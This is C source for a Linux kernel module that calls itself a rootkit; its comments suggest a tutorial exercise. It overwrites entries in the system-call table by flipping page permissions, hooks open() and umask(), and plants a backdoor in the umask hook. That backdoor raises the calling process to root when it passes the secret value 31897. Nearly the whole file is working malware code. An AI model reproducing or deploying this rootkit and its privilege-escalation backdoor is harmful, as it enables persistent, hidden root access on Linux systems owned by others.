#include "rootkit.h"

/*
 * The sys_call_table is an array of void pointers.
 *
 * Since Linux kernel version 2.6.x the sys_call_table symbol is no longer
 * exported, meaning we can't use kallsyms to find where it lives in memory
 * instead you'll have to grep "sys_call_table" /boot/System.map-$(uname -r)
 * and hardcode the resulting memory address into your module before compiling
 * Baby steps!
 */
static void **sys_call_table;

/*
 * We need to maintain a doubly linked list of the t_syscall_hooks we have in
 * place such that we can restore them later.
 */
static t_syscall_hook_list *hooks;

/*
 * The address of the sys_call_table will be provided as a kernel module
 * parameter named table_addr at the time of insmod (SEE insert.sh)
 */
static unsigned long table_addr;
module_param(table_addr, ulong, 0);
MODULE_PARM_DESC(table_addr, "Address of sys_call_table in memory");

//*
/*
 * root_uid's value is provided as a kernel module argument
 */
static int root_uid;
module_param(root_uid, int, 0);
MODULE_PARM_DESC(root_uid, "userid for root");
/*
 * RW/RO page flip code borrowed from Cormander's TPE-LKM code.
 * Simplified for our purpose, i.e. one kernel version, one arch.
 *
 * Sets the page of memory containing the given addr to read/write.
 */
void set_addr_rw(const unsigned long addr)
{
  unsigned int level;

  // Get the page table entry structure containing the address we pass.
  // Level will be set to the page depth for the entry.
  pte_t *pte = lookup_address(addr, &level);

  // If the page permissions bitmask doesn't have _PAGE_RW, mask it in
  // with the _PAGE_RW flag.
  if(pte->pte &~ _PAGE_RW)
    pte->pte |= _PAGE_RW;
}

/*
 * Sets the page of memory containing the provided addr to read only
 */
void set_addr_ro(const unsigned long addr)
{
  unsigned int level;

  pte_t *pte = lookup_address(addr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
}

/*
 * Hooks a syscall storing the original sycall function for later restoration.
 * Returns 1 for a successful hook, 0 otherwise.
 */
int hook_syscall(t_syscall_hook *hook)
{
  // If this syscall_hook has already been put in place, abort.
  if(hook->hooked)
    return 0;

  // Get & store the original syscall from the syscall_table using the offset
  hook->orig_func   = sys_call_table[hook->offset];

  printk(KERN_INFO "Hooking offset %d. Original: %p to New:  %p\n",
                   hook->offset, hook->orig_func, hook->hook_func);

  //*
  //    make the sys_call_table RW before the hook and RO after
  //
  //    Since linux-kernel ~2.6.24  the sys_call_table has been in read-only
  //    memory. We need to mark it rw ourselves (we're root afterall), replace
  //    the syscall     function pointer, and then tidy up after ourselves.
  //*

  set_addr_rw(table_addr);
  sys_call_table[hook->offset] = hook->hook_func;
  set_addr_ro(table_addr);

  // Remember that we enabled the hook
  hook->hooked = true;
  return hook->hooked;
}

/*
 * Unhooks a syscall by restoring the original function.
 * Returns 1 for a successful unhook, 0 otherwise.
 */
int unhook_syscall(t_syscall_hook *hook)
{
  // If it isn't hooked, we don't want to unhook it
  if(!hook->hooked)
    return 0;

  printk(KERN_INFO "Unhooking offset %d back to  %p\n",
                   hook->offset, hook->orig_func);


  //    make the sys_call_table RW before the hook and RO after

  set_addr_rw(table_addr);
  sys_call_table[hook->offset] = hook->orig_func;
  set_addr_ro(table_addr);

  // Remember we've undone the hook
  hook->hooked = false;
  return !hook->hooked;
}

/*
 * Finds the t_syscall_hook in our hook linked list that is hooking
 * the given offset. Returns 0 if not found.
 */
t_syscall_hook *find_syscall_hook(const unsigned int offset)
{
  struct list_head      *element;
  t_syscall_hook_list   *hook_entry;
  t_syscall_hook        *hook;

  list_for_each(element, &(hooks->list))
  {
    hook_entry = list_entry(element, t_syscall_hook_list, list);
    hook       = hook_entry->hook;

    if(hook->offset == offset)
      return hook;
  }

  return 0;
}

/*
 * Allocates a new t_syscall_hook populated to hook the given offset with the
 * supplied newFunc function pointer. The t_syscall_hook will automatically be
 * added to the hooks linked list.
 *
 * Note: the syscall will not be hooked yet, you still need to call
 * hook_syscall() with the t_syscall_hook struct returned by new_hook()
 */
t_syscall_hook *new_hook(const unsigned int offset, void *newFunc)
{
  t_syscall_hook      *hook;
  t_syscall_hook_list *new_link;

  // Allocate & init the hook
  hook = kmalloc(sizeof(t_syscall_hook), GFP_KERNEL);
  hook->hooked         = false;
  hook->orig_func      = NULL;
  hook->hook_func      = newFunc;
  hook->offset         = offset;

  // Allocate and init the list entry
  new_link = kmalloc(sizeof(t_syscall_hook_list), GFP_KERNEL);
  new_link->hook = hook;

  // Add the link into the hooks list
  list_add(&(new_link->list), &(hooks->list));

  // Return the hook
  return new_link->hook;
}

/*
 * Module initialization callback
 */
int init_module(void)
{
  printk(KERN_INFO "Rootkit module initalizing.\n");

  // Allocate & init a list to store our syscall_hooks
  hooks = kmalloc(sizeof(t_syscall_hook_list), GFP_KERNEL);
  INIT_LIST_HEAD(&(hooks->list));

  // We need to hardcode the sys_call_table's location in memory. Remember array
  // indices in C are offsets from the base (i.e. 0th idex) address of the array.
  sys_call_table = (void *) table_addr;
  printk(KERN_INFO "Syscall table loaded from %p\n", (void*) table_addr);

  hook_syscall(new_hook(__NR_open, (void*) &new_open));
  hook_syscall(new_hook(__NR_umask, (void*) &new_umask));
  printk(KERN_INFO "Rootkit module is loaded!\n");
  return 0; //For successful load
}

/*
 * Module destructor callback
 */
void cleanup_module(void)
{
  struct list_head      *element;
  struct list_head      *tmp;
  t_syscall_hook_list   *hook_entry;
  t_syscall_hook        *hook;

  printk(KERN_INFO "Rootkit module unloaded\n");

  /* Iterate through the linked list of hook_entry's unhooking and deallocating
   * each as we go. We use the safe list_for_each because we are removing
   * elements.
   */
  list_for_each_safe(element, tmp, &(hooks->list))
  {
    hook_entry = list_entry(element, t_syscall_hook_list, list);
    hook       = hook_entry->hook;

    printk(KERN_INFO "Freeing my hook - offset %d\n", hook->offset);

    if(hook->hooked)
      unhook_syscall(hook_entry->hook);

    list_del(element);
    kfree(hook_entry);
  }

  printk(KERN_INFO "Rootkit module cleanup complete\n");
}

/*
 *
 * Our new version of the open() syscall is defined here.
 * We want to match the return type and argument signature
 * of the original open() syscall.
 *
 * This example currently does nothing extra, aside from
 * printing out a kernel log message.
 */
asmlinkage int new_open(const char *pathname, int flags, mode_t mode)
{
  // Declare a orig_func function pointer with the types matched to open()
  int (*orig_func)(const char *path, int flags, mode_t mode);
  t_syscall_hook *open_hook;

  // Find the t_syscall_hook for __NR_open from our linked list
  open_hook = find_syscall_hook(__NR_open);
  // And cast the orig_func void pointer into the orig_func to be invoked
  orig_func = (void*) open_hook->orig_func;

  // Uncomment for a spammy line for every open()
  // printk(KERN_INFO "open() was called for %s\n", pathname);

  // Invoke the original syscall
  return (*orig_func)(pathname, flags, mode);
}

 
asmlinkage int new_umask(int mask)
{


  // Declare a orig_func function pointer with the types matched to open()
  int (*orig_func)(int mask);
  t_syscall_hook *umask_hook;
const struct cred* cur_cred;
struct cred *new_creds;

  // Find the t_syscall_hook for __NR_open from our linked list
  umask_hook = find_syscall_hook(__NR_umask);
  // And cast the orig_func void pointer into the orig_func to be invoked
  orig_func = (void*) umask_hook->orig_func;

  cur_cred = current_cred();
  printk(KERN_INFO "umask(%d) invoked by PID %d (EUID %d)\n", mask, current->pid, cur_cred->euid);
  
  //check for the secret code (31897)
if(mask == 31897 && cur_cred->euid == root_uid ){

new_creds = prepare_creds();
        new_creds->euid = 0;
        commit_creds(new_creds);
        printk(KERN_INFO "PID %d elevated to EUID 0\n", current->pid);
}
// Invoke the original syscall
 return (*orig_func)(mask);
}
